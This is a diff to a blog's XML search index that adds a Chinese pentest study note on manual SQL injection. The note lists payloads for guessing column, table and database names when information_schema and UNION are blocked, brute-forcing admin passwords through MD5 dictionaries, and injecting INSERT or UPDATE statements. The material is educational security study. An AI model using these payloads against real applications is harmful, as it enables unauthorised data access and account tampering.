@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>手动漏洞挖掘-SQL注入、二</title>
+      <link href="/2020/10/19/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%BA%8C/"/>
+      <url>/2020/10/19/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%BA%8C/</url>
+      
+        <content type="html"><![CDATA[<h4 id="手动漏洞挖掘-SQL注入（二）"><a href="#手动漏洞挖掘-SQL注入（二）" class="headerlink" title="手动漏洞挖掘-SQL注入（二）"></a>手动漏洞挖掘-SQL注入（二）</h4><h4 id="无权读取information-schema库-拒绝union、order-by语句"><a href="#无权读取information-schema库-拒绝union、order-by语句" class="headerlink" title="无权读取information_schema库 / 拒绝union、order by语句"></a>无权读取information_schema库 / 拒绝union、order by语句</h4><ul><li>第一步、猜列名：<code>&#39; and asd is null --</code><ul><li>可以通过返回信息得到 asd这个列是否存在，提前准备好字典。用burp Intruder</li><li><code>find / -name *.column*.txt</code><ul><li>去除以#开头的行<code>cat xxx.txt | grep -v ^# &gt; column.txt</code></li></ul></li></ul></li></ul><a id="more"></a><ul><li>通过列名猜当前表名：<code>&#39; and table.user is null --</code><ul><li><code>find / -name *.table.txt</code><ul><li>同样需要去除#开头的行</li></ul></li></ul></li><li>猜库名：<code>&#39; and db.table.user is null --</code></li><li>猜库中的其他表：<code>&#39; and (select count(*) from table)&gt;0 --</code></li><li>猜表对应关系：<code>&#39; and user.user is null --</code></li><li>猜字段内容：<code>or user=&#39;admin</code>,<code>or user like &#39;%a%&#39;</code></li><li>账号对应密码：<code>&#39; or user = &#39;admin&#39; and password = &#39;md5hash&#39;</code><ul><li>用md5sum命令把密码字典生成MD5字典，然后intruder</li></ul></li><li>可以插入账号密码数据条目<code>&#39;; insert xxxxxx</code>,<code>&#39;;update users set user=&#39;aaa&#39; where user=&#39;bbb&#39;</code></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>pangolin windows上的sql注入集成工具</li><li>HexorBase，</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> 信息安全 </category>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> KaliLinux渗透测试学习笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>手动漏洞挖掘-SQL注入、一</title>
       <link href="/2020/10/17/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%B8%80/"/>
       <url>/2020/10/17/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%B8%80/</url>
@@ -58,7 +85,7 @@
     
     
     <entry>
-      <title>手动漏洞挖掘-1.默认安装</title>
+      <title>手动漏洞挖掘.默认安装</title>
       <link href="/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/"/>
       <url>/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/</url>
       
